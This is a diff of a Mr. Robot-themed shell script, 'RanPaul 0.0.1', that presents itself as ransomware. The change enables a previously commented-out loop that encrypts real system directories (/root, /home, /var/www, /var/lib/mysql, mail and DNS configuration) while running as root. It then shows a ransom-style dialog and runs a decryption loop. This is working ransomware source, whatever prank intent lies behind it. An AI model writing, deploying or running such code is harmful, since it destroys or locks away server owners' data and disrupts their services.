@@ -35,9 +35,7 @@ check_req() {
 	if [ "$(whoami)" != "root" ]; then
 		notroot
 	fi
-	if [ "$(which openssl)" != "" ]; then
-		echo
-	else
+	if [ "$(which openssl)" = "" ]; then
 		noopenssl
 	fi
 }
@@ -53,7 +51,7 @@ openfile() {
 	fi
 }
 adderr() { ERRMSG="$ERRMSG\n$1"; }
-EXIT() { echo "[+] DUMPING MESSAGES:$ERRMSG\n[!] EXITING"; exit; }
+EXIT() { echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"; exit; }
 init() {
 	check_req
 	check_msg
@@ -80,24 +78,26 @@ case "$DIALOG" in
 *)
 	$DIALOG --backtitle "RanPaul 0.0.1" \
        		--title "$1" \
-       		--yesno "$2" 15 60
+       		--yesno "$2" 18 60
         result=$?
 	;;
 esac
 case "$result" in
 Yes|Y|y)
 	echo You got the files, pal! goodbye now..
-	exit
+	break
 	;;
 0)
-	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "You got the files now, pal!\nGoodbye Elliot..." 10 50
+	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "You got the files now, pal!\n\nGoodbye Elliot..." 10 50
+	break
 	;;	
 1)
-	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "Well Elliot,\nthe files are gone. You're gonna have to figure something out..." 10 50
+	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "Well Elliot,\n\nThe files are gone. You're gonna have to figure something out..." 10 50
+	EXIT
 	;;	
 *)
 	echo "Well buddy, the files are gone. Youre gonna have to figure something out here...!"
-	exit
+	EXIT
 	;;
 esac
 }
@@ -115,13 +115,14 @@ pck() {
 	fi
 }
 enc_loop() {
-	kills=$1
+	kills="$1"
 	for i in $kills; do
 		if [ -d "$i" ]; then
 			navdir "$i/*" "pck"
 			adderr "[+] Encrypted $i"
+			#} | $DIALOG --gauge "Encrypting Files..." 10 50 0
 		fi
-	done	
+	done
 }
 ################## DECRYPT ################################
 dec() {
@@ -136,13 +137,13 @@ upk() {
 }
 dec_loop() {
 	dec
-	kills=$1
+	kills="$1"
 	for i in $kills; do
 		if [ -d "$i" ]; then
 			navdir "$i/*" "upk"
 			adderr "[+] Decrypted $i"
 		fi
-	done	
+	done
 }
 ################# MAIN ######################################
 main() {
@@ -151,10 +152,11 @@ main() {
 	SOFT="YES"
 	init
 	targets="/var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
-	#enc_loop "$targets"
-	message="Congratulations Elliot,\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Im giving you a choice. You can either encrypt some important files, or lose access to your box and keep the files. Your choice kid.\nLove, Mr. Robot\n\nKeep the files?"
+	enc_loop "$targets"
+	message="Congratulations Elliot,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Im giving you a choice. You can either encrypt some important files, or lose access to your box and keep the files. Your choice kid.\n\nLove, Mr. Robot\n\n\nKeep the files?"
 	title="Oops.."
 	showmess "$title" "$message"
+	dec_loop "$targets"
 	EXIT
 }
 main
